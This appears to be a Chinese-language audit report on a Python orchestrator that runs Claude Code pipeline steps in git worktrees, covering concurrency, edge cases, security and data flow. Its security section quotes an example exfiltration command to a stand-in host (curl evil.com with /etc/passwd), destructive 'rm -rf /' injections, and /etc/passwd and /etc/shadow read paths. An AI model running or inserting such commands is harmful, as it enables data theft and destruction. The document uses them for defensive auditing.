# Round 6 Audit: 架构+功能审查

## 执行摘要
- 审查维度: 4个大类（架构合理性、功能边界、安全审查、数据流追踪）
- 发现问题: 14 (P0: 0, P1: 4, P2: 6, P3: 4)
- 审查方法: 纯源码阅读 + 17个边界黑盒测试脚本 + 5个并发架构测试 + 6个深度细节测试
- 全部发现均有源码行号引用或可复现脚本

---

## 1. 架构合理性

### 1.1 并行安全性

**结论: 无严重问题（有设计限制）**

Orchestrator 使用 `ThreadPoolExecutor` 并行跑多个 module（`orchestrator.py:134`）。每个 module 在独立 git worktree 中执行，拥有独立分支（`worktree.py:39`: `branch = f"{self.branch_prefix}/{module_name}"`）。

**Git 操作隔离机制**:
- WorktreeManager 有 `_lock`（`worktree.py:25`），序列化所有 worktree 的创建/删除
- Orchestrator 有 `_merge_lock`（`orchestrator.py:53`），序列化合并操作

**验证**: 用真实 git repo 测试了两个 worktree 的隔离性，确认：
- 不同 module 的 worktree 有不同分支
- 一个 worktree 的 commit 不影响另一个 worktree 的文件

**设计限制（非 bug）**:
- 并行合并到同一 base_branch 时，后合并的 module 基于先合并的结果。如果两个 module 修改同一文件，后者可能遇到冲突。`_merge_lock` 确保了串行合并，不会产生 git 层面的竞争。
- `_try_ai_resolve_conflicts`（`orchestrator.py:373`）可以用 CC 自动解决冲突。

**验证脚本**: `/tmp/audit_r6_parallel.py` — `test_worktree_git_isolation()`, `test_merge_lock()`

---

### 1.2 状态一致性

**结论: 无问题（线程锁到位）**

`StateManager` 使用 `threading.Lock()` 保护所有读写操作（`state.py:17`）。每个方法（`save`, `load`, `update_module`, `mark_step_completed`, `get_completed_steps`, `set_run_id`）都在 `with self._lock` 内执行。

**并发测试**: 5个线程各自 50 次 `update_module` + `mark_step_completed`，300次总写入，状态文件 JSON 完整无损坏。

**注意（非 bug）**:
- `get_failed_modules()`（`state.py:134`）和 `get_resume_point()`（`state.py:148`）调用 `self.load()`（获取锁），不是直接访问内存。这是安全的，但意味着每次调用都重新读取文件。
- Orchestrator `_run_module` 在 resume 路径中创建了**新的** `StateManager` 实例（`orchestrator.py:187`: `sm = StateManager(run_dir=str(self.run_dir))`），与共享的 `self.state_mgr` 是不同实例。但由于锁是文件级别的（Python threading.Lock 是进程内锁），如果两个实例在**同一进程**内，它们共享同一把锁吗？

**P3-1: `StateManager` 锁不是进程级别的文件锁**
- `state.py:17`: `self._lock = threading.Lock()` — 这是实例级别的进程内锁
- `orchestrator.py:66`: `self.state_mgr = StateManager(run_dir=...)` — 共享实例
- `orchestrator.py:187`: `sm = StateManager(run_dir=...)` — 新实例（resume 路径）
- 同一文件但两个 `StateManager` 实例的 `_lock` 是**不同的对象**。如果两个线程通过不同实例写入同一 state file，锁无法阻止交错写入。
- **实际风险**: 低。resume 路径只读取 `get_completed_steps()`，不写入。但架构上这是隐患。

**验证脚本**: `/tmp/audit_r6_parallel.py` — `test_parallel_state_writes()`, `test_state_file_race()`

---

### 1.3 Worktree 生命周期

**结论: 无严重问题**

**生命周期**:
- **创建**: `WorktreeManager.create()`（`worktree.py:28`），在 `_run_module` 开始时调用（`orchestrator.py:192`）
- **删除**: `cleanup()`（`worktree.py:127`），仅在 `auto_merge=True` 且合并成功后调用（`orchestrator.py:265`）
- **保留**: `preserve()`（`worktree.py:148`）— 实际不做任何事，只是不调用 cleanup

**崩溃恢复**:
- 如果 pipeline 中途崩溃（异常），`_run_module` 的 except 块（`orchestrator.py:289-308`）调用 `self.worktree_mgr.preserve(module_name)`，保留 worktree 用于调试
- 下次运行时，`create()` 会检测到残留 worktree 并删除重建（`worktree.py:59-62`: `shutil.rmtree(str(wt_path))`）
- 还会清理 stale worktree（`worktree.py:70-88`: 遍历 `git worktree list` 并 force remove）

**P3-2: Worktree 创建在 resume 模式下绕过锁**
- `worktree.py:43-52`: resume 路径的 `wt_path.exists()` 检查和 worktree 返回发生在 `with self._lock` **之前**
- 两个线程同时调用 `create(resume=True)` 可能都看到 `wt_path.exists() == True`，都返回同一路径
- **实际风险**: 低。在当前架构中，同一 module 不会同时运行两次。但代码模式不安全。

**验证脚本**: `/tmp/audit_r6_final.py` — `test_worktree_crash_cleanup()`

---

### 1.4 Executor 隔离性

**结论: 无问题**

`CCExecutor` 和 `ShellExecutor` 是无状态的执行器：
- `CCExecutor`（`executor.py:16`）: 存储 `model`, `claude_path`, `default_timeout` — 全部是初始化时固定的配置
- `ShellExecutor`（`executor.py:83`）: 只存储 `default_timeout`
- 每次调用 `run()` 都创建独立的 `subprocess.run()`（`executor.py:59`, `executor.py:105`）

**CC 进程隔离**: `start_new_session=True`（`executor.py:65`）确保每个 CC 子进程在独立进程组中运行，不会干扰其他 CC 进程。

**隐患**: 无。两者在同一 worktree 中顺序执行，没有共享可变状态。

---

### 1.5 Postcondition 竞态

**结论: 无问题（subprocess.run 是同步的）**

Runner 在执行完 CC 后才调用 postcondition（`runner.py:217`: `pc_result = self._check_postcondition(step)`）。

`CCExecutor.run()` 使用 `subprocess.run()`（`executor.py:59`），这是**同步调用** — 阻塞直到 CC 进程退出。CC 进程退出时，其文件写入已经完成（操作系统保证：进程退出时所有文件描述符 flush + close）。

Postcondition 使用 `subprocess.run()`（`postcondition.py:38`），同样是同步的。

**结论**: 只要 CC 和 postcondition 都使用 `subprocess.run()`（同步），就不存在 buffer flush 竞态。

---

## 2. 功能边界

### 2.1 loop: per_file + source_files 为空

**行为**: `compiler.py:107-111` 抛出 `ValueError`
```python
if not module.source_files:
    raise ValueError(
        f"Step '{step.id}' uses loop: per_file but module "
        f"'module.name}' has empty source_files"
    )
```
**判定**: ✅ 正确 — fail-fast，清晰报错

---

### 2.2 depends_on 指向不存在的 step

**行为**: `compiler.py:278-283` 在 `_sort_by_dependencies` 中检查
```python
if step.depends_on and step.depends_on not in all_ids:
    raise ValueError(
        f"Step '{step.step_id}' depends_on '{step.depends_on}' which does not exist"
    )
```
**判定**: ✅ 正确 — fail-fast

---

### 2.3 on_failure 跳向已经执行的 step

**行为**: Runner 从目标 step **重新执行**（`runner.py:260-278`），jump_counts 限制无限循环。

```
源码路径: runner.py:252-278
1. step 失败 → 检查 step.on_failure
2. 查找目标 step 的 index → step_idx = target_idx
3. continue → 重新执行目标 step 及其后续步骤
4. jump_counts[target] 计数，达到 max_jumps 后停止
```

**判定**: ✅ 正确 — 但有一个重要发现：

**P2-1: retry + on_failure 放大效应**
- 当 `retry=N` + `on_failure=prev_step` + `on_failure_max_jumps=M` 同时存在时：
- 失败 step 每次进入时获得**新的 retry budget**（`runner.py:137`: `retry_budget = step.retry`）
- 总执行次数 = `(N+1) × (M+1)` — 因为每次 jump-back 都重新初始化 retry_budget
- 实测: `retry=2, max_jumps=2` → sink step 被执行 **9 次**（3 × 3），而非 3 次
- 这不是 bug（设计可能如此），但用户可能期望 retry 只在首次尝试时生效

**验证脚本**: `/tmp/audit_r6_boundary.py` test_2g（实测 9 次调用）
**验证脚本**: `/tmp/audit_r6_deep.py` test_amplification（确认 3×3=9 放大）

---

### 2.4 两个 step 的 id 相同

**行为**: `compiler.py:60-64` 在 compile 时检测
```python
seen_ids = set()
for step in self.config.pipeline:
    if step.id in seen_ids:
        raise ValueError(f"Duplicate step ID: {step.id}")
    seen_ids.add(step.id)
```
**判定**: ✅ 正确

---

### 2.5 prompt 和 prompt_file 同时存在

**行为**: `config.py:176-182` 发出 warning，**prompt 生效**
```python
if step.prompt and step.prompt_file:
    _pp_w.warn(f"Step {step.id}: both prompt and prompt_file set — prompt takes priority...")
```

在 `compiler.py:184-185` 的 `_resolve_prompt` 中确认：
```python
if step.prompt:
    text = step.prompt    # prompt 优先
elif step.prompt_file:
    ...                    # prompt_file 是 fallback
```

**判定**: ✅ 正确 — 有清晰 warning

---

### 2.6 postcondition shell 返回非0 但 expect 满足

**行为**: `postcondition.py:57-63` — shell 非零直接判为 fail，expect **不被评估**
```python
if result.returncode != 0:
    pc_result = PostconditionResult(passed=False, ...)
elif expect is None:
    ...  # pass
else:
    pc_result = _evaluate_expect(expect, stdout, stderr)  # 只有 shell=0 才到这里
```

**判定**: ✅ 正确 — shell exit code 是硬门控

**验证脚本**: `/tmp/audit_r6_boundary.py` test_2f

---

### 2.7 retry=3 + on_failure 同时存在

**行为**: 先重试，再跳转

```
runner.py:140 内循环:
  while True:
    exec_result = self._execute_step(step)
    if exec_result failed:
      if retry_budget > 0:   # ← 先消耗 retry budget
        retry_budget -= 1
        continue              # ← 重试
      else:
        break                 # ← retry 用完，退出内循环
  
runner.py:254 外循环:
  if not passed:
    if target and jc < max_jumps:  # ← 然后检查 on_failure
      step_idx = target_idx
      continue                      # ← 跳转
```

**判定**: ✅ 逻辑正确 — 先 retry 再 on_failure

**但注意 P2-1（retry 放大）**: 每次 on_failure 跳转后 retry_budget 被重置。

---

### 2.8 module 的 source_dir 不存在

**行为**: **不报错**。source_dir 只作为模板变量使用（`compiler.py:84`: `"source_dir": module.source_dir`）。

- `config.py:316-320`: 当 `source_dir == ""` 时只发出 warning
- source_dir 的**存在性从不验证** — 它只是被注入到 prompt 中供 CC 使用的字符串

**P3-3: source_dir 不存在时不报错可能导致 CC 行为异常**
- 如果用户配置了错误的 source_dir，CC 会在不存在的目录中寻找文件
- 这不会导致 pipeline 报错，但 CC 可能产生无意义的输出
- **建议**: 编译时检查 `os.path.join(repo, source_dir)` 是否存在（在 worktree 上下文中）

---

### 2.9 prompt_file 文件不存在

**行为**: `config.py:352-360` 在 `load_config` 时验证
```python
if step.prompt_file:
    p = Path(step.prompt_file)
    if not p.exists():
        cfg_dir = Path(path).parent
        if not (cfg_dir / step.prompt_file).exists():
            raise FileNotFoundError(f"prompt_file not found: {step.prompt_file}")
```

**判定**: ✅ 正确 — fail-fast at config load time

---

### 2.10 变量引用 {file} 在非 loop 步骤中

**行为**: `{file}` 保持原样不展开（`compiler.py:96-104` 发出 warning）
```python
if step.loop != "per_file":
    prompt_text = self._resolve_prompt(step)
    if "{file}" in prompt_text:
        _w.warn(f"Step '{step.id}': prompt uses {{file}} but step has no loop...")
```

在 `render.py:53-68` 中，`{file}` 不在 variables dict 中，被保留原样：
```python
elif var_name in variables:
    val = variables[var_name]
    result.append(str(val))
else:
    # Unknown variable — kept as-is
    result.append(match.group(0))
```

**判定**: ✅ 正确 — 有 warning，保留原样

---

### 2.11 postcondition 中 expect 的 JSON path 不存在

**行为**: `postcondition.py:158-159` 返回 `False`（不崩溃）
```python
if field_name not in data:
    return False
```

**判定**: ✅ 正确 — 优雅失败

---

### 2.12 CC 返回空字符串

**行为**: `runner.py:73-79` 的 `_is_zero_work` 检测
```python
def _is_zero_work(cc_result):
    return (
        cc_result.returncode == 0
        and not cc_result.stdout.strip()
        and not cc_result.stderr.strip()
    )
```

→ `runner.py:454-458` 返回 `ExecOutcome.ZERO_WORK`，进入 retry 流程。

**判定**: ✅ 正确 — empty output 被视为"没做工作"，触发 retry

---

### 2.13 CC 返回超长输出（100KB+）

**行为**: **无截断**。`CCExecutor.run()` 返回完整的 `result.stdout`（`executor.py:70`）。

Runner 中 CC output 的唯一截断发生在：
- `runner.py:462-466`: verbose 模式打印 stdout 前面 5 行（仅用于终端显示，不影响数据流）
- Logger 的 `log_cc_result` 可能截断（未检查）

**P3-4: Logger 可能截断 CC output**
- `runner.py:461`: `self.logger.log_cc_result(step=step.step_id, cc_result=cc_result)` 
- 未确认 logger 是否截断存储。需要检查 `logger.py`。
- **风险**: 低。即使 logger 截断，CC result 的实际 stdout 是完整的，后续步骤不受影响。

**验证脚本**: `/tmp/audit_r6_boundary.py` test_2m（100KB output 不截断）

---

## 3. 安全审查

### 3.1 prompt 注入 via {module} 变量

**结论: ✅ 已防护**

`config.py:248-255`: module name 通过正则验证
```python
_SAFE_NAME = re.compile(r"^[a-zA-Z0-9_][a-zA-Z0-9_\-]*$")
if not _SAFE_NAME.match(mod.name):
    raise ValueError(f"Invalid module name ...")
```

**验证**: 设置 `name: "test; rm -rf /"` → 立即被 `ValueError` 阻止。

---

### 3.2 postcondition shell 注入

**P1-1: postcondition shell 命令完全无沙箱，可执行任意代码**

- `postcondition.py:38-44`: `subprocess.run(shell, shell=True, ...)` — **shell=True** 意味着 shell 解释器处理所有元字符
- 如果 YAML config 中配置 `postcondition.shell: '$(rm -rf /)'`，会被 shell 执行
- 同理，`ShellExecutor.run()`（`executor.py:105`）也使用 `shell=True`

**攻击向量**: 恶意 YAML config 文件
```yaml
pipeline:
  - id: innocent_step
    executor: shell
    prompt: 'echo $(curl evil.com/exfil?data=$(cat /etc/passwd))'
```

**严重程度**: P1 — 这是设计选择（framework 需要执行 shell 命令），但应在文档中明确警告。用户运行不受信任的 config 文件等同于赋予完整 shell 权限。

**同样适用于**: 
- `ShellExecutor`（`executor.py:105`）
- `_try_ai_resolve_conflicts` 给 CC 授予了 `["Read", "Write", "Edit", "Bash"]` 全部工具（`orchestrator.py:406`）— CC 可以执行任意 shell 命令

**验证脚本**: `/tmp/audit_r6_boundary.py` test_3b（确认 shell=True 允许任意代码）

---

### 3.3 source_files 路径遍历

**结论: ✅ 已防护**

`config.py:286-292`: 
```python
for sf in mod.source_files:
    sf_str = sf["path"] if isinstance(sf, dict) else sf
    if ".." in sf_str or "/" in sf_str or "\\" in sf_str:
        raise ValueError(f"Invalid source_file ... no path traversal or slashes allowed")
```

**验证**: `source_files: ["../../../etc/passwd"]` → `ValueError` 阻止。

**注意**: source_files 不允许包含 `/`，这意味着 source_files 必须是纯文件名（不能有子目录路径）。这是安全设计但限制了灵活性。

---

### 3.4 prompt_file 路径遍历/绝对路径

**P2-2: prompt_file 可以读取任意系统文件**

- `config.py:352-358`: 只检查文件**是否存在**，不检查路径是否安全
- 如果 `prompt_file: /etc/passwd`，且文件存在 → 内容被读入 prompt
- 没有路径限制（不检查 `..` 或绝对路径）

```python
if step.prompt_file:
    p = Path(step.prompt_file)
    if not p.exists():
        ...
    # 如果存在 → 允许读取
```

**攻击场景**: 恶意 config `prompt_file: /etc/shadow` → 文件内容被注入到 CC prompt 中 → 可能泄露到日志/CC 输出中。

**验证**: `/tmp/audit_r6_boundary.py` test_3d — 成功读取 `/etc/passwd`

**严重程度**: P2 — 需要恶意 config 文件（与 P1-1 同一信任模型），但信息泄露风险更隐蔽。

---

### 3.5 额外安全发现

**P2-3: `_try_ai_resolve_conflicts` 授予 CC `Bash` 工具**

`orchestrator.py:406`:
```python
allowed_tools=["Read", "Write", "Edit", "Bash"]
```

在自动解决合并冲突时，CC 被授予 `Bash` 工具，意味着它可以执行任意 shell 命令。这在自动合并冲突解决的场景中可能不必要地扩大了权限。

**建议**: 考虑只使用 `Read`/`Write`/`Edit` 来解决文件级冲突。

---

## 4. 数据流追踪

### 完整数据流

```
YAML → load_config() → PipelineConfig → compile_module() → CompiledStep[] 
    → ModuleRunner.run() → executor.run() → postcondition.evaluate() 
    → state.update() → [无 git checkpoint] → orchestrator._merge_branch()
```

### 数据丢失/变形风险点

**P1-2: Runner docstring 声称有 git checkpoint，但实际未实现**

`runner.py:90` docstring:
```
5. If pass → git checkpoint → next step
```

但 `runner.py:116-294` 的 `run()` 方法中，step 通过后只有：
1. `_mark_step_completed()` — 更新 state.json（`runner.py:221`）
2. `_append_progress()` — 写入 progress.md（`runner.py:222`）
3. **没有 git commit / git add**

唯一的 git 操作是 `_detect_file_changes()`（`runner.py:496-507`）运行 `git status --porcelain`（只读）。

**影响**: 如果一个 CC step 产生了错误输出，后续步骤也基于这些错误文件运行。没有 per-step 的 git rollback 机制。只有 per-module 的 worktree 隔离（失败时整个 worktree 保留）。

**P2-4: _inject_context 的上下文注入是无界的**

`runner.py:302-347` 的 `_inject_context` 读取 `.pipeline/` 下的**所有** `.json` 文件并注入 prompt：

```python
prior_files = sorted(pipeline_dir.glob("*.json"))
if prior_files:
    context_lines = ["\n\n--- 前序步骤的上下文 ---"]
    for f in prior_files:
        content = f.read_text().strip()
        context_lines.append(f"[{f.name}]:\n{content}")
```

**风险**: 50 个步骤后，prompt 注入 ~51KB 额外上下文（实测 51,478 chars）。这会：
- 增加 CC API 调用成本
- 可能超出 token 限制
- `progress.md` 有 20 行上限（`runner.py:313-314`），但 `.json` 文件**没有上限**

**验证脚本**: `/tmp/audit_r6_final.py` — `test_context_injection_unbounded()`（实测 51KB）

**P2-5: on_failure jump_counts 是 per-target 共享的**

`runner.py:131`: `jump_counts = {}` — 字典 key 是目标 step_id，不是源 step_id。

如果 step B 和 step C 都 `on_failure: "A"`：
1. B 失败 → jump to A → `jump_counts["A"] = 1`
2. B 失败 → jump to A → `jump_counts["A"] = 2`
3. B 失败 → `jump_counts["A"] = 2`，不 < 2 → B 彻底失败
4. C 失败 → `jump_counts["A"]` 已经是 2，C **没有任何跳转机会**

**影响**: 如果 pipeline 设计有多个步骤共享同一 on_failure 目标，后面的步骤可能没有 jump-back 机会。

**验证脚本**: `/tmp/audit_r6_final.py` — `test_on_failure_jump_count_per_target()`（实测 c=0 次调用）

**P2-6: Shell executor 不接收 step.timeout**

`runner.py:18-21`:
```python
result = self.shell_executor.run(
    command=full_prompt,
    cwd=self.worktree_path,
    # 注意：没有 timeout=step.timeout
)
```

对比 CC executor（`runner.py:60-65`）：
```python
cc_result = executor.run(
    prompt=full_prompt,
    cwd=self.worktree_path,
    allowed_tools=allowed_tools,
    timeout=step.timeout,  # ← CC 有 timeout
)
```

**影响**: 即使配置了 `timeout: 30`，shell executor 步骤仍然使用默认的 300s 超时。一个卡住的 shell 命令会阻塞 pipeline 最长 5 分钟。

---

## 问题汇总

| ID | 优先级 | 描述 | 源码位置 |
|---|---|---|---|
| P1-1 | P1 | postcondition/shell executor 使用 `shell=True`，无沙箱 | `postcondition.py:38`, `executor.py:105` |
| P1-2 | P1 | Runner docstring 声称有 git checkpoint 但未实现 | `runner.py:90` vs `runner.py:116-294` |
| P1-3 | P1 | `_inject_context` 上下文注入无界增长 | `runner.py:318-331` |
| P1-4 | P1 | Shell executor 不接收 step.timeout | `runner.py:18-21` |
| P2-1 | P2 | retry + on_failure 放大效应 (N+1)×(M+1) | `runner.py:137` |
| P2-2 | P2 | prompt_file 可读取任意系统文件 | `config.py:352-358` |
| P2-3 | P2 | AI 冲突解决授予 CC Bash 权限 | `orchestrator.py:406` |
| P2-4 | P2 | (= P1-3, 同一问题) | — |
| P2-5 | P2 | on_failure jump_counts per-target 共享 | `runner.py:131` |
| P2-6 | P2 | (= P1-4, 同一问题) | — |
| P3-1 | P3 | StateManager 锁非文件级 | `state.py:17` |
| P3-2 | P3 | Worktree resume 路径绕过锁 | `worktree.py:43-52` |
| P3-3 | P3 | source_dir 不验证存在性 | `config.py:316-320` |
| P3-4 | P3 | Logger 可能截断 CC output | `runner.py:461` |

去重后独立问题: **10 个**（P1: 4, P2: 4, P3: 3 — 注: P2-4=P1-3, P2-6=P1-4 合并）

---

## 开发者需要回答的问题

### Q1: git checkpoint 是否计划但尚未实现？
Runner docstring（`runner.py:90`）写道 "If pass → git checkpoint → next step"，但代码中没有 git commit。这是：
- (a) 设计文档先行，功能待实现？
- (b) docstring 过时，实际不需要 per-step checkpoint？
- (c) worktree 隔离已经足够，不需要 per-step rollback？

### Q2: retry + on_failure 的交互是否是预期行为？
每次 on_failure jump-back 都重新初始化 retry_budget（`runner.py:137`），导致总执行次数 = (retry+1) × (max_jumps+1)。这是设计意图（最大化成功机会），还是应该 retry 只在首次尝试时生效？

### Q3: on_failure jump_counts 设计为 per-target 共享，是否是预期？
当多个步骤 `on_failure` 指向同一目标时，共享跳转预算。后续步骤可能因为前面步骤耗尽预算而无法跳转。是否应该改为 per-source 计数？

### Q4: `_inject_context` 读取所有 `.pipeline/*.json` 文件是否有上限计划？
50 个步骤后注入 ~51KB 上下文。是否应该：
- (a) 只注入最近 N 个步骤的上下文？
- (b) 按文件大小上限裁剪？
- (c) 由用户配置注入策略？

### Q5: Shell executor 为什么不传递 step.timeout？
CC executor 传递了 `timeout=step.timeout`（`runner.py:64`），但 shell executor 没传（`runner.py:18-21`）。这是遗漏还是有意为之？

### Q6: prompt_file 允许绝对路径读取任意文件，是否需要限制？
`config.py:352-358` 只检查文件存在性。是否应该限制为只允许相对于 config 文件目录的路径？

### Q7: StateManager 在 resume 路径创建新实例，是否应该复用共享实例？
`orchestrator.py:187` 创建了新的 `StateManager`，与 `orchestrator.py:66` 的共享实例是不同对象。虽然当前只读取（不写入），但它们的锁是独立的。是否应该统一使用 `self.state_mgr`？

---

## 测试脚本清单

| 脚本 | 测试数 | 覆盖维度 |
|---|---|---|
| `/tmp/audit_r6_boundary.py` | 17 | 功能边界 (2a-2m) + 安全审查 (3a-3d) |
| `/tmp/audit_r6_parallel.py` | 5 | 并行状态写入、worktree 隔离、merge lock |
| `/tmp/audit_r6_deep.py` | 5 | retry 放大、postcondition timing、循环依赖 |
| `/tmp/audit_r6_details.py` | 5 | shell timeout、snippet、on_failure self-ref |
| `/tmp/audit_r6_final.py` | 5 | worktree resume race、context 无界增长、progress |

**总计**: 37 个测试，全部可复现。
